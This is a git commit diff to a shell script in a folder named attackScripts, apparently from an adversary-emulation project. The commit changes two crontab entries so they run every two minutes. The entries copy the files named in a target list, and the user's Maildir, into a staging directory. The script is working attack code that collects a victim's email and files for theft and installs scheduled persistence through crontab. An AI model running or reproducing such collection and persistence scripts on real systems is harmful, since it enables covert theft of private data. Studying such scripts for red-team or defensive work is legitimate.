a6104d5f654c00a5ed68d88b5dc01172f4847da5
suhail97s <72452276+suhail97s@users.noreply.github.com>
2022-10-24 02:52:41 +0800

    changed to every 2 min

--- attackScripts/collectiontarget.sh
+++ attackScripts/collectiontarget.sh
@@ -6,5 +6,5 @@ cat /home/resch/.scripts/fndd-stripped.txt | xargs -I % rsync -a % /home/resch/d
 # rsync Mail directory
 rsync -a ~/Maildir /home/resch/destination
 # Crontab that will run every 2 minutes to update any changes
-(crontab -l 2>/dev/null || true; echo "2 * * * * cat /home/resch/.scripts/fndd-stripped.txt | xargs -I % rsync -a % /home/resch/destination/") | crontab -
-(crontab -l 2>/dev/null || true; echo "2 * * * * rsync -a ~/Maildir /home/resch/destination") | crontab -
+(crontab -l 2>/dev/null || true; echo "*/2 * * * * cat /home/resch/.scripts/fndd-stripped.txt | xargs -I % rsync -a % /home/resch/destination/") | crontab -
+(crontab -l 2>/dev/null || true; echo "*/2 * * * * rsync -a ~/Maildir /home/resch/destination") | crontab -
